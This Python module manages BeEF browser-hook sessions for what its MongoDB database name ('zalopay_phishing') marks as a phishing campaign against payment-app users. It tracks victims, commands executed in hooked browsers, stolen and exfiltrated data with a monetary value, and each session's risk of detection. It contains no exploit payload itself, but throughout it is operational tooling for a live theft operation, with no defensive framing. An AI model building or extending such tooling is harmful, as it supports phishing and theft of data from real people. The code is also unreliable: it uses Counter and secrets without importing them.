"""
BeEF Session Manager
Advanced session tracking and management for BeEF exploitation
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import threading
from collections import defaultdict

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BeEFSessionManagerConfig:
    """BeEF session manager configuration"""

    def __init__(self):
        self.session_timeout = int(os.getenv("BEEF_SESSION_TIMEOUT", "1800"))  # 30 minutes
        self.cleanup_interval = int(os.getenv("BEEF_CLEANUP_INTERVAL", "300"))  # 5 minutes
        self.max_sessions_per_victim = int(os.getenv("MAX_SESSIONS_PER_VICTIM", "3"))
        self.enable_session_persistence = os.getenv("ENABLE_SESSION_PERSISTENCE", "true").lower() == "true"
        self.session_heartbeat_interval = int(os.getenv("SESSION_HEARTBEAT_INTERVAL", "60"))
        self.enable_session_analytics = os.getenv("ENABLE_SESSION_ANALYTICS", "true").lower() == "true"

class BeEFSession:
    """Enhanced BeEF session with tracking"""

    def __init__(self, session_id: str, victim_id: str, hook_session_id: str,
                 ip_address: str = None, user_agent: str = None):
        self.session_id = session_id
        self.victim_id = victim_id
        self.hook_session_id = hook_session_id
        self.ip_address = ip_address
        self.user_agent = user_agent
        self.created_at = datetime.now(timezone.utc)
        self.last_heartbeat = datetime.now(timezone.utc)
        self.is_active = True

        # Session state
        self.browser_info = {}
        self.system_info = {}
        self.network_info = {}
        self.stolen_data = {}

        # Exploitation tracking
        self.commands_executed = []
        self.modules_loaded = []
        self.data_exfiltrated = []
        self.vulnerabilities_found = []

        # Performance metrics
        self.response_times = []
        self.avg_response_time = 0.0
        self.commands_per_minute = 0.0

        # Security status
        self.security_score = 100.0
        self.detection_risk = "low"
        self.antivirus_detected = False

        # Session metadata
        self.tags = []
        self.notes = []
        self.priority = "normal"

    def update_heartbeat(self):
        """Update session heartbeat"""
        self.last_heartbeat = datetime.now(timezone.utc)

        # Update performance metrics
        if self.response_times:
            self.avg_response_time = sum(self.response_times) / len(self.response_times)

    def add_command_execution(self, command: str, success: bool, response_time: float = None):
        """Add command execution record"""
        execution_record = {
            "command": command,
            "success": success,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "response_time": response_time
        }

        self.commands_executed.append(execution_record)

        if response_time:
            self.response_times.append(response_time)

        # Update commands per minute
        recent_commands = [
            cmd for cmd in self.commands_executed
            if (datetime.now(timezone.utc) - datetime.fromisoformat(cmd["timestamp"])).total_seconds() < 60
        ]
        self.commands_per_minute = len(recent_commands)

    def add_stolen_data(self, data_type: str, data: Any, value: float = 0.0):
        """Add stolen data record"""
        data_record = {
            "type": data_type,
            "data": data,
            "value": value,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        self.stolen_data[data_type] = data_record
        self.data_exfiltrated.append(data_record)

    def update_browser_info(self, browser_data: Dict[str, Any]):
        """Update browser information"""
        self.browser_info.update(browser_data)

        # Update security score based on browser
        self._calculate_security_score()

    def update_system_info(self, system_data: Dict[str, Any]):
        """Update system information"""
        self.system_info.update(system_data)

    def update_network_info(self, network_data: Dict[str, Any]):
        """Update network information"""
        self.network_info.update(network_data)

    def _calculate_security_score(self):
        """Calculate security score based on browser characteristics"""
        try:
            score = 100.0

            # Browser type risk
            user_agent = self.user_agent or ""
            if "headless" in user_agent.lower():
                score -= 30
            elif "bot" in user_agent.lower():
                score -= 25

            # Plugin count (more plugins = more legitimate)
            plugin_count = len(self.browser_info.get("plugins", []))
            if plugin_count < 3:
                score -= 20

            # Screen resolution risk
            screen = self.browser_info.get("screen", {})
            if screen.get("width", 0) < 1024 or screen.get("height", 0) < 768:
                score -= 15

            # Language risk
            language = self.browser_info.get("language", "")
            if language in ["", "en-US"]:  # Generic or missing language
                score -= 10

            self.security_score = max(0.0, score)

            # Update detection risk
            if self.security_score < 30:
                self.detection_risk = "critical"
            elif self.security_score < 50:
                self.detection_risk = "high"
            elif self.security_score < 70:
                self.detection_risk = "medium"
            else:
                self.detection_risk = "low"

        except Exception as e:
            logger.error(f"Error calculating security score: {e}")
            self.security_score = 50.0
            self.detection_risk = "medium"

    def is_expired(self) -> bool:
        """Check if session is expired"""
        time_diff = datetime.now(timezone.utc) - self.last_heartbeat
        return time_diff.total_seconds() > self._get_session_timeout()

    def _get_session_timeout(self) -> int:
        """Get session timeout based on priority"""
        base_timeout = int(os.getenv("BEEF_SESSION_TIMEOUT", "1800"))

        if self.priority == "critical":
            return base_timeout * 2
        elif self.priority == "high":
            return int(base_timeout * 1.5)
        else:
            return base_timeout

    def get_session_summary(self) -> Dict[str, Any]:
        """Get session summary"""
        return {
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "is_active": self.is_active,
            "duration": (datetime.now(timezone.utc) - self.created_at).total_seconds(),
            "commands_executed": len(self.commands_executed),
            "data_exfiltrated": len(self.data_exfiltrated),
            "security_score": self.security_score,
            "detection_risk": self.detection_risk,
            "last_heartbeat": self.last_heartbeat.isoformat()
        }

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "hook_session_id": self.hook_session_id,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "created_at": self.created_at.isoformat(),
            "last_heartbeat": self.last_heartbeat.isoformat(),
            "is_active": self.is_active,
            "browser_info": self.browser_info,
            "system_info": self.system_info,
            "network_info": self.network_info,
            "stolen_data": self.stolen_data,
            "commands_executed": self.commands_executed,
            "modules_loaded": self.modules_loaded,
            "data_exfiltrated": self.data_exfiltrated,
            "vulnerabilities_found": self.vulnerabilities_found,
            "response_times": self.response_times,
            "avg_response_time": self.avg_response_time,
            "commands_per_minute": self.commands_per_minute,
            "security_score": self.security_score,
            "detection_risk": self.detection_risk,
            "antivirus_detected": self.antivirus_detected,
            "tags": self.tags,
            "notes": self.notes,
            "priority": self.priority
        }

class SessionTracker:
    """Session tracking and analytics"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.sessions: Dict[str, BeEFSession] = {}
        self.victim_sessions: Dict[str, List[str]] = defaultdict(list)  # victim_id -> session_ids

    def register_session(self, session: BeEFSession) -> bool:
        """Register new BeEF session"""
        try:
            self.sessions[session.session_id] = session
            self.victim_sessions[session.victim_id].append(session.session_id)

            # Limit sessions per victim
            max_sessions = int(os.getenv("MAX_SESSIONS_PER_VICTIM", "3"))
            if len(self.victim_sessions[session.victim_id]) > max_sessions:
                oldest_session_id = self.victim_sessions[session.victim_id].pop(0)
                self.destroy_session(oldest_session_id)

            # Store in Redis for quick access
            if self.redis:
                self._store_session_in_redis(session)

            # Store in MongoDB
            if self.mongodb:
                self._store_session_in_mongodb(session)

            logger.info(f"BeEF session registered: {session.session_id}")
            return True

        except Exception as e:
            logger.error(f"Error registering session: {e}")
            return False

    def get_session(self, session_id: str) -> Optional[BeEFSession]:
        """Get session by ID"""
        return self.sessions.get(session_id)

    def get_victim_sessions(self, victim_id: str) -> List[BeEFSession]:
        """Get all sessions for victim"""
        session_ids = self.victim_sessions.get(victim_id, [])
        return [self.sessions[sid] for sid in session_ids if sid in self.sessions]

    def update_session_activity(self, session_id: str) -> bool:
        """Update session activity"""
        try:
            if session_id in self.sessions:
                self.sessions[session_id].update_heartbeat()

                # Update in Redis
                if self.redis:
                    self._update_session_in_redis(session_id)

                return True

            return False

        except Exception as e:
            logger.error(f"Error updating session activity: {e}")
            return False

    def destroy_session(self, session_id: str) -> bool:
        """Destroy BeEF session"""
        try:
            if session_id not in self.sessions:
                return False

            session = self.sessions[session_id]

            # Remove from victim sessions
            if session.victim_id in self.victim_sessions:
                if session_id in self.victim_sessions[session.victim_id]:
                    self.victim_sessions[session.victim_id].remove(session_id)

            # Remove session
            del self.sessions[session_id]

            # Remove from Redis
            if self.redis:
                self._delete_session_from_redis(session_id)

            # Remove from MongoDB
            if self.mongodb:
                self._delete_session_from_mongodb(session_id)

            logger.info(f"BeEF session destroyed: {session_id}")
            return True

        except Exception as e:
            logger.error(f"Error destroying session: {e}")
            return False

    def get_active_sessions(self) -> List[BeEFSession]:
        """Get all active sessions"""
        return [session for session in self.sessions.values() if session.is_active]

    def get_high_risk_sessions(self) -> List[BeEFSession]:
        """Get high risk sessions"""
        return [
            session for session in self.sessions.values()
            if session.detection_risk in ["high", "critical"]
        ]

    def _store_session_in_redis(self, session: BeEFSession):
        """Store session in Redis"""
        try:
            if not self.redis:
                return

            key = f"beef_session:{session.session_id}"
            data = json.dumps(session.to_dict())

            # Set expiration
            ttl = int((session.created_at + timedelta(seconds=session._get_session_timeout()) - datetime.now(timezone.utc)).total_seconds())
            if ttl > 0:
                self.redis.setex(key, ttl, data)

        except Exception as e:
            logger.error(f"Error storing session in Redis: {e}")

    def _update_session_in_redis(self, session_id: str):
        """Update session in Redis"""
        try:
            if not self.redis:
                return

            session = self.sessions.get(session_id)
            if session:
                self._store_session_in_redis(session)

        except Exception as e:
            logger.error(f"Error updating session in Redis: {e}")

    def _delete_session_from_redis(self, session_id: str):
        """Delete session from Redis"""
        try:
            if not self.redis:
                return

            key = f"beef_session:{session_id}"
            self.redis.delete(key)

        except Exception as e:
            logger.error(f"Error deleting session from Redis: {e}")

    def _store_session_in_mongodb(self, session: BeEFSession):
        """Store session in MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            sessions_collection = db.beef_sessions

            document = session.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(hours=24)  # Keep for 24 hours

            sessions_collection.replace_one(
                {"session_id": session.session_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing session in MongoDB: {e}")

    def _delete_session_from_mongodb(self, session_id: str):
        """Delete session from MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            sessions_collection = db.beef_sessions

            sessions_collection.delete_one({"session_id": session_id})

        except Exception as e:
            logger.error(f"Error deleting session from MongoDB: {e}")

class SessionAnalytics:
    """Session analytics and insights"""

    def __init__(self, session_tracker: SessionTracker):
        self.session_tracker = session_tracker

    def generate_session_report(self, victim_id: str = None) -> Dict[str, Any]:
        """Generate session analytics report"""
        try:
            if victim_id:
                sessions = self.session_tracker.get_victim_sessions(victim_id)
            else:
                sessions = self.session_tracker.get_active_sessions()

            if not sessions:
                return {"error": "No sessions found"}

            report = {
                "report_type": "session_analytics",
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "total_sessions": len(sessions),
                "victim_summary": {}
            }

            if victim_id:
                report["victim_id"] = victim_id
                report["victim_summary"] = self._analyze_victim_sessions(sessions)
            else:
                report["global_summary"] = self._analyze_global_sessions(sessions)

            # Add detailed analytics
            report["analytics"] = {
                "performance_metrics": self._analyze_performance_metrics(sessions),
                "security_analysis": self._analyze_security_status(sessions),
                "geographic_distribution": self._analyze_geographic_distribution(sessions),
                "browser_analysis": self._analyze_browser_types(sessions),
                "activity_patterns": self._analyze_activity_patterns(sessions)
            }

            return report

        except Exception as e:
            logger.error(f"Error generating session report: {e}")
            return {"error": "Failed to generate report"}

    def _analyze_victim_sessions(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze sessions for specific victim"""
        try:
            if not sessions:
                return {}

            total_commands = sum(len(session.commands_executed) for session in sessions)
            total_data = sum(len(session.data_exfiltrated) for session in sessions)

            # Find most active session
            most_active = max(sessions, key=lambda s: len(s.commands_executed))

            # Calculate average security score
            avg_security = sum(session.security_score for session in sessions) / len(sessions)

            return {
                "session_count": len(sessions),
                "total_commands": total_commands,
                "total_data_exfiltrated": total_data,
                "most_active_session": most_active.session_id,
                "avg_security_score": avg_security,
                "highest_risk": min(sessions, key=lambda s: s.security_score).detection_risk,
                "first_seen": min(sessions, key=lambda s: s.created_at).created_at.isoformat(),
                "last_seen": max(sessions, key=lambda s: s.last_heartbeat).last_heartbeat.isoformat()
            }

        except Exception as e:
            logger.error(f"Error analyzing victim sessions: {e}")
            return {}

    def _analyze_global_sessions(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze all sessions globally"""
        try:
            if not sessions:
                return {}

            # Geographic distribution
            countries = Counter()
            ips = set()

            for session in sessions:
                if session.ip_address:
                    ips.add(session.ip_address)
                if session.network_info.get("country"):
                    countries[session.network_info["country"]] += 1

            # Browser distribution
            browsers = Counter()
            for session in sessions:
                user_agent = session.user_agent or ""
                if "Chrome" in user_agent:
                    browsers["Chrome"] += 1
                elif "Firefox" in user_agent:
                    browsers["Firefox"] += 1
                elif "Safari" in user_agent:
                    browsers["Safari"] += 1
                elif "Edge" in user_agent:
                    browsers["Edge"] += 1
                else:
                    browsers["Other"] += 1

            return {
                "total_victims": len(set(session.victim_id for session in sessions)),
                "unique_ips": len(ips),
                "country_distribution": dict(countries.most_common(10)),
                "browser_distribution": dict(browsers),
                "avg_session_duration": self._calculate_avg_session_duration(sessions),
                "total_commands_executed": sum(len(session.commands_executed) for session in sessions)
            }

        except Exception as e:
            logger.error(f"Error analyzing global sessions: {e}")
            return {}

    def _analyze_performance_metrics(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze performance metrics"""
        try:
            if not sessions:
                return {}

            # Response time analysis
            all_response_times = []
            for session in sessions:
                all_response_times.extend(session.response_times)

            avg_response_time = sum(all_response_times) / len(all_response_times) if all_response_times else 0

            # Commands per minute analysis
            commands_per_minute_values = [session.commands_per_minute for session in sessions]
            avg_commands_per_minute = sum(commands_per_minute_values) / len(commands_per_minute_values)

            return {
                "avg_response_time": avg_response_time,
                "avg_commands_per_minute": avg_commands_per_minute,
                "total_commands": sum(len(session.commands_executed) for session in sessions),
                "success_rate": self._calculate_success_rate(sessions)
            }

        except Exception as e:
            logger.error(f"Error analyzing performance metrics: {e}")
            return {}

    def _analyze_security_status(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze security status"""
        try:
            if not sessions:
                return {}

            # Security score distribution
            security_scores = [session.security_score for session in sessions]
            avg_security_score = sum(security_scores) / len(security_scores)

            # Risk level distribution
            risk_levels = Counter(session.detection_risk for session in sessions)

            # Antivirus detection
            av_detected = sum(1 for session in sessions if session.antivirus_detected)

            return {
                "avg_security_score": avg_security_score,
                "risk_level_distribution": dict(risk_levels),
                "antivirus_detected_sessions": av_detected,
                "high_risk_sessions": len([s for s in sessions if s.detection_risk in ["high", "critical"]]),
                "security_trend": self._analyze_security_trend(sessions)
            }

        except Exception as e:
            logger.error(f"Error analyzing security status: {e}")
            return {}

    def _analyze_geographic_distribution(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze geographic distribution"""
        try:
            countries = Counter()
            regions = Counter()

            for session in sessions:
                country = session.network_info.get("country")
                if country:
                    countries[country] += 1

                region = session.network_info.get("region")
                if region:
                    regions[region] += 1

            return {
                "top_countries": dict(countries.most_common(10)),
                "top_regions": dict(regions.most_common(10)),
                "geographic_diversity": len(countries)
            }

        except Exception as e:
            logger.error(f"Error analyzing geographic distribution: {e}")
            return {}

    def _analyze_browser_types(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze browser types"""
        try:
            browsers = Counter()
            platforms = Counter()

            for session in sessions:
                user_agent = session.user_agent or ""

                # Browser detection
                if "Chrome" in user_agent and "Edg" not in user_agent:
                    browsers["Chrome"] += 1
                elif "Firefox" in user_agent:
                    browsers["Firefox"] += 1
                elif "Safari" in user_agent and "Chrome" not in user_agent:
                    browsers["Safari"] += 1
                elif "Edg" in user_agent:
                    browsers["Edge"] += 1
                else:
                    browsers["Other"] += 1

                # Platform detection
                if "Windows" in user_agent:
                    platforms["Windows"] += 1
                elif "Mac" in user_agent:
                    platforms["macOS"] += 1
                elif "Linux" in user_agent:
                    platforms["Linux"] += 1
                elif "Android" in user_agent:
                    platforms["Android"] += 1
                elif "iOS" in user_agent:
                    platforms["iOS"] += 1
                else:
                    platforms["Other"] += 1

            return {
                "browser_distribution": dict(browsers),
                "platform_distribution": dict(platforms)
            }

        except Exception as e:
            logger.error(f"Error analyzing browser types: {e}")
            return {}

    def _analyze_activity_patterns(self, sessions: List[BeEFSession]) -> Dict[str, Any]:
        """Analyze activity patterns"""
        try:
            hourly_activity = Counter()
            daily_activity = Counter()

            for session in sessions:
                # Analyze creation times
                created_hour = session.created_at.hour
                created_day = session.created_at.weekday()

                hourly_activity[created_hour] += 1
                daily_activity[created_day] += 1

            return {
                "most_active_hour": max(hourly_activity.items(), key=lambda x: x[1])[0] if hourly_activity else 0,
                "most_active_day": max(daily_activity.items(), key=lambda x: x[1])[0] if daily_activity else 0,
                "hourly_distribution": dict(hourly_activity),
                "daily_distribution": dict(daily_activity)
            }

        except Exception as e:
            logger.error(f"Error analyzing activity patterns: {e}")
            return {}

    def _calculate_avg_session_duration(self, sessions: List[BeEFSession]) -> float:
        """Calculate average session duration"""
        try:
            durations = []
            for session in sessions:
                duration = (datetime.now(timezone.utc) - session.created_at).total_seconds()
                durations.append(duration)

            return sum(durations) / len(durations) if durations else 0

        except Exception:
            return 0.0

    def _calculate_success_rate(self, sessions: List[BeEFSession]) -> float:
        """Calculate command success rate"""
        try:
            total_commands = 0
            successful_commands = 0

            for session in sessions:
                for command in session.commands_executed:
                    total_commands += 1
                    if command.get("success", False):
                        successful_commands += 1

            return (successful_commands / total_commands * 100) if total_commands > 0 else 0

        except Exception:
            return 0.0

    def _analyze_security_trend(self, sessions: List[BeEFSession]) -> str:
        """Analyze security trend"""
        try:
            if not sessions:
                return "unknown"

            # Simple trend analysis based on recent sessions
            recent_sessions = [
                session for session in sessions
                if (datetime.now(timezone.utc) - session.created_at).total_seconds() < 3600  # Last hour
            ]

            if not recent_sessions:
                return "stable"

            avg_recent_security = sum(session.security_score for session in recent_sessions) / len(recent_sessions)
            avg_overall_security = sum(session.security_score for session in sessions) / len(sessions)

            if avg_recent_security < avg_overall_security - 10:
                return "degrading"
            elif avg_recent_security > avg_overall_security + 10:
                return "improving"
            else:
                return "stable"

        except Exception:
            return "unknown"

class BeEFSessionManager:
    """Main BeEF session manager"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = BeEFSessionManagerConfig()
        self.session_tracker = SessionTracker(mongodb_connection, redis_client)
        self.analytics = SessionAnalytics(self.session_tracker)

        # Cleanup thread
        self.cleanup_thread = None
        self._start_cleanup_thread()

    def _start_cleanup_thread(self):
        """Start cleanup thread"""
        if self.cleanup_thread is None:
            self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
            self.cleanup_thread.start()

    def _cleanup_loop(self):
        """Cleanup loop"""
        while True:
            try:
                time.sleep(self.config.cleanup_interval)
                self.cleanup_expired_sessions()
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")

    def create_session(self, victim_id: str, hook_session_id: str,
                      ip_address: str = None, user_agent: str = None) -> str:
        """Create new BeEF session"""
        try:
            session_id = f"beef_session_{int(time.time())}_{secrets.token_hex(4)}"

            session = BeEFSession(
                session_id=session_id,
                victim_id=victim_id,
                hook_session_id=hook_session_id,
                ip_address=ip_address,
                user_agent=user_agent
            )

            if self.session_tracker.register_session(session):
                logger.info(f"BeEF session created: {session_id}")
                return session_id

            return ""

        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return ""

    def update_session_data(self, session_id: str, data_type: str, data: Dict[str, Any]) -> bool:
        """Update session data"""
        try:
            session = self.session_tracker.get_session(session_id)
            if not session:
                return False

            if data_type == "browser":
                session.update_browser_info(data)
            elif data_type == "system":
                session.update_system_info(data)
            elif data_type == "network":
                session.update_network_info(data)
            else:
                logger.warning(f"Unknown data type: {data_type}")
                return False

            # Update activity
            session.update_heartbeat()

            # Update in storage
            if self.redis:
                self.session_tracker._update_session_in_redis(session_id)

            return True

        except Exception as e:
            logger.error(f"Error updating session data: {e}")
            return False

    def record_command_execution(self, session_id: str, command: str, success: bool,
                               response_time: float = None) -> bool:
        """Record command execution"""
        try:
            session = self.session_tracker.get_session(session_id)
            if not session:
                return False

            session.add_command_execution(command, success, response_time)
            session.update_heartbeat()

            return True

        except Exception as e:
            logger.error(f"Error recording command execution: {e}")
            return False

    def record_data_exfiltration(self, session_id: str, data_type: str, data: Any, value: float = 0.0) -> bool:
        """Record data exfiltration"""
        try:
            session = self.session_tracker.get_session(session_id)
            if not session:
                return False

            session.add_stolen_data(data_type, data, value)
            session.update_heartbeat()

            return True

        except Exception as e:
            logger.error(f"Error recording data exfiltration: {e}")
            return False

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get session information"""
        try:
            session = self.session_tracker.get_session(session_id)
            if session:
                return session.get_session_summary()
            return None

        except Exception as e:
            logger.error(f"Error getting session info: {e}")
            return None

    def get_victim_sessions_info(self, victim_id: str) -> List[Dict[str, Any]]:
        """Get all sessions info for victim"""
        try:
            sessions = self.session_tracker.get_victim_sessions(victim_id)
            return [session.get_session_summary() for session in sessions]

        except Exception as e:
            logger.error(f"Error getting victim sessions info: {e}")
            return []

    def cleanup_expired_sessions(self) -> int:
        """Clean up expired sessions"""
        try:
            expired_sessions = []

            for session_id, session in self.session_tracker.sessions.items():
                if session.is_expired():
                    expired_sessions.append(session_id)

            for session_id in expired_sessions:
                self.session_tracker.destroy_session(session_id)

            if expired_sessions:
                logger.info(f"Cleaned up {len(expired_sessions)} expired BeEF sessions")

            return len(expired_sessions)

        except Exception as e:
            logger.error(f"Error cleaning up expired sessions: {e}")
            return 0

    def get_session_statistics(self) -> Dict[str, Any]:
        """Get session statistics"""
        try:
            total_sessions = len(self.session_tracker.sessions)
            active_sessions = len(self.session_tracker.get_active_sessions())
            high_risk_sessions = len(self.session_tracker.get_high_risk_sessions())

            # Calculate averages
            avg_commands = 0
            avg_data_exfiltrated = 0
            avg_security_score = 0.0

            if total_sessions > 0:
                total_commands = sum(len(session.commands_executed) for session in self.session_tracker.sessions.values())
                total_data = sum(len(session.data_exfiltrated) for session in self.session_tracker.sessions.values())
                total_security = sum(session.security_score for session in self.session_tracker.sessions.values())

                avg_commands = total_commands / total_sessions
                avg_data_exfiltrated = total_data / total_sessions
                avg_security_score = total_security / total_sessions

            return {
                "total_sessions": total_sessions,
                "active_sessions": active_sessions,
                "high_risk_sessions": high_risk_sessions,
                "avg_commands_per_session": avg_commands,
                "avg_data_exfiltrated_per_session": avg_data_exfiltrated,
                "avg_security_score": avg_security_score,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting session statistics: {e}")
            return {"error": "Failed to get statistics"}

    def generate_analytics_report(self, victim_id: str = None) -> Dict[str, Any]:
        """Generate analytics report"""
        return self.analytics.generate_session_report(victim_id)

# Global BeEF session manager instance
beef_session_manager = None

def initialize_beef_session_manager(mongodb_connection=None, redis_client=None) -> BeEFSessionManager:
    """Initialize global BeEF session manager"""
    global beef_session_manager
    beef_session_manager = BeEFSessionManager(mongodb_connection, redis_client)
    return beef_session_manager

def get_beef_session_manager() -> BeEFSessionManager:
    """Get global BeEF session manager"""
    if beef_session_manager is None:
        raise ValueError("BeEF session manager not initialized")
    return beef_session_manager

# Convenience functions
def create_session(victim_id: str, hook_session_id: str, ip_address: str = None, user_agent: str = None) -> str:
    """Create session (global convenience function)"""
    return get_beef_session_manager().create_session(victim_id, hook_session_id, ip_address, user_agent)

def update_session_data(session_id: str, data_type: str, data: Dict[str, Any]) -> bool:
    """Update session data (global convenience function)"""
    return get_beef_session_manager().update_session_data(session_id, data_type, data)

def record_command_execution(session_id: str, command: str, success: bool, response_time: float = None) -> bool:
    """Record command execution (global convenience function)"""
    return get_beef_session_manager().record_command_execution(session_id, command, success, response_time)

def get_session_info(session_id: str) -> Optional[Dict[str, Any]]:
    """Get session info (global convenience function)"""
    return get_beef_session_manager().get_session_info(session_id)

def get_session_statistics() -> Dict[str, Any]:
    """Get session statistics (global convenience function)"""
    return get_beef_session_manager().get_session_statistics()

def generate_analytics_report(victim_id: str = None) -> Dict[str, Any]:
    """Generate analytics report (global convenience function)"""
    return get_beef_session_manager().generate_analytics_report(victim_id)